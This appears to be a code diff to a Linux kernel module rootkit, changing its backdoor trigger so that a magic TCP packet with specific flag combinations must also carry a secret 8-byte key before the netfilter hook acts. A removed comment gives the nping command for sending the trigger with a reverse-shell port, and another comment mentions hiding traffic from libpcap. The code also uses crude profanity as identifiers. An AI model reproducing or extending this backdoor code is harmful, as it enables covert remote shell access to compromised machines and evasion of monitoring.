@@ -20,6 +20,7 @@
 #include "fs.h"
 #include "lkm.h"
 #include "log.h"
+#include "bdkey.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -425,21 +426,32 @@ static int _bd_watchdog(void *t)
 #endif
 }
 
-/**
- *  if TCP flags are:
- *  FUCK, CUNT or ASS then you know...
- */
-bool kv_check_cursing(struct tcphdr *t) {
-    uint8_t fuckoff = 0;
+bool kv_check_bdkey(struct tcphdr *t, struct sk_buff *skb) {
+    uint8_t silly_word = 0;
     enum { FUCK=0x8c, CUNT=0xa5, ASS=0x38 };
 
-    fuckoff = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
+    silly_word = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
         t->ack << 3| t->urg << 2| t->ece <<1| t->cwr;
 
-    //sudo nping <IP> --tcp -p <dst port> --flags <flag1,flag2,...> --source-port <reverse shell port> -c 1
-    if (fuckoff == FUCK || fuckoff == CUNT || fuckoff == ASS)
-        return true;
+    if (silly_word == FUCK || silly_word == CUNT || silly_word == ASS)
+    {
+        uint64_t address_value = 0;
+        unsigned long a = BDKEY;
+        unsigned char *data = skb->data + 40;
 
+        if (skb->len >= sizeof(struct tcphdr) + sizeof(struct iphdr) + 8) {
+            address_value = ((unsigned long)data[0] << 56) |
+                ((unsigned long)data[1] << 48) |
+                ((unsigned long)data[2] << 40) |
+                ((unsigned long)data[3] << 32) |
+                ((unsigned long)data[4] << 24) |
+                ((unsigned long)data[5] << 16) |
+                ((unsigned long)data[6] << 8)  |
+                (unsigned long)data[7];
+            if (address_value == BDKEY)
+                return true;
+        }
+    }
     return false;
 }
 
@@ -460,7 +472,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
                 int dst = _check_bdports(htons(tcph->dest));
 
                 /** Silence libpcap on CUNT/ASS/FUCK */
-                if (dst == RR_NULL || !kv_check_cursing(tcph)) break;
+                if (dst == RR_NULL || !kv_check_bdkey(tcph, skb)) break;
 
                 kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
                 if (!kf) {
